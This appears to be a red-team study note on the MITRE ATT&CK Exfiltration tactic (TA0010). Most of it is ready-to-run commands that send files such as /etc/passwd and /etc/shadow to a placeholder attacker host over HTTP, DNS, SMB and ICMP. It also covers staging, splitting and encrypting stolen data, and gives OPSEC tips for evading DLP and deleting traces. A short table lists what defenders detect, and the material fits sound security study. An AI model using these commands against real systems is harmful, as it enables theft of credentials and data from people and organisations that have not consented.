---
type: tactic-hub
room: red
tactic: "Exfiltration"
tactic_id: "TA0010"
tags: [red/exfiltration, mitre/TA0010]
date_updated: {{date}}
---

# TA0010 — Exfiltration

> [!quote]
> *"The game is never over until it is truly over."*

**MITRE Reference:** [TA0010](https://attack.mitre.org/tactics/TA0010/) | **Kill Chain Phase:** Exfiltration

The adversary is trying to steal data. The entire operation culminates here. After gathering and staging, the adversary must move data out of the environment — through DLP controls, firewalls, and monitoring — without triggering an alert.

---

## Techniques in This Tactic

| Technique ID | Name |
|-------------|------|
| [[T1041 - Exfiltration Over C2 Channel]] | Over existing C2 |
| [[T1048 - Exfiltration Over Alternative Protocol]] | DNS, ICMP, SMTP |
| [[T1052 - Exfiltration Over Physical Medium]] | USB |
| [[T1567 - Exfiltration Over Web Service]] | Pastebin, S3, Dropbox |
| [[T1029 - Scheduled Transfer]] | Timed exfil to avoid detection |
| [[T1030 - Data Transfer Size Limits]] | Split into small chunks |

---

## Standard Exfiltration Workflows

### Over HTTP/S (T1041 / T1567)
```bash
# Simple HTTP POST (attacker has a listener)
curl -X POST http://<attacker>/exfil --data-binary @/etc/passwd
curl -X POST https://<attacker>/exfil -F "file=@/path/to/loot.zip"

# Encode as base64 to bypass content inspection
cat /etc/shadow | base64 | curl -X POST http://<attacker>/exfil -d @-

# Python upload to attacker web server
python3 -c "
import requests
with open('/path/to/loot','rb') as f:
    requests.post('http://<attacker>/upload', files={'file':f})
"
```

### DNS Exfiltration (T1048.003)
```bash
# Encode data in DNS query labels (max 63 chars per label)
# Each chunk becomes a DNS query subdomain

# Manual (small data)
cat /etc/passwd | base64 | tr -d '\n' | fold -w 60 | while read chunk; do
  nslookup "$chunk.exfil.<attacker_domain>" <attacker_dns>
done

# dnscat2 tunnel (built-in file transfer)
# In dnscat2 session:
# exec cat /etc/passwd > output.txt
# download output.txt

# iodine (DNS tunnel for IP traffic)
# Server: iodined -f -c -P password 192.168.99.1 tunnel.<attacker_domain>
# Client: iodine -f -P password tunnel.<attacker_domain>
```

### SMB / File Share (T1041)
```bash
# From Linux target → attacker SMB share
# Attacker: impacket-smbserver share /tmp/loot -smb2support
smbclient //<attacker_ip>/share -N -c "put /etc/shadow shadow"

# Windows → SMB copy
net use Z: \\<attacker_ip>\share
copy C:\Temp\loot.zip Z:\
```

### Staging Before Exfil
```bash
# Archive and compress sensitive data
tar czf /tmp/.loot.tar.gz /home/user/Documents /etc/passwd /etc/shadow
zip -r /tmp/loot.zip /var/www/html/

# Split large archives (T1030)
split -b 10m /tmp/.loot.tar.gz /tmp/.chunk_
# Transfer each chunk separately

# Encrypt before exfil
openssl enc -aes-256-cbc -salt -in loot.tar.gz -out loot.enc -k "passphrase"
```

### Exfil over ICMP (T1048.002)
```bash
# icmptunnel (requires root on both ends)
# Server (attacker): ./icmptunnel -s 10.0.0.1
# Client (target): ./icmptunnel <attacker_ip>

# Manual ICMP ping exfil (small data, slow)
xxd -p /etc/passwd | while read chunk; do ping -c 1 -p "$chunk" <attacker_ip>; done
```

---

## OPSEC Considerations

> [!warning] Size and Timing Matter
> - Large file transfers spike bandwidth graphs — transfer at night / during business hours when traffic is normal.
> - DNS exfil generates NXDOMAIN floods — space out queries with `sleep`.
> - Upload to cloud services (Dropbox, OneDrive) may blend with legitimate traffic but triggers DLP.
> - Encrypt before exfil — any cleartext sensitive data pattern is a DLP regex hit.
> - Delete staging files immediately after transfer.

---

## What Blue Sees

| Activity | Log Source | Event / Indicator |
|----------|-----------|-------------------|
| Large HTTP POST | Proxy / Web | Unusual outbound payload size |
| DNS exfil | DNS logs | Long subdomain labels, high query rate |
| Cloud upload | DLP / Proxy | Sensitive content to cloud storage |
| SMB exfil | Network | Outbound SMB to external IP |
| Staged archive | AV / EDR | `tar`, `zip` on sensitive paths |

---

## Related Notes

- [[TA0009 - Collection]] ← Data must be gathered first
- [[TA0011 - Command and Control]] ← C2 channel often doubles as exfil channel

↩ [[Red - Notes]] · [[Red]] · [[Mind Palace]]
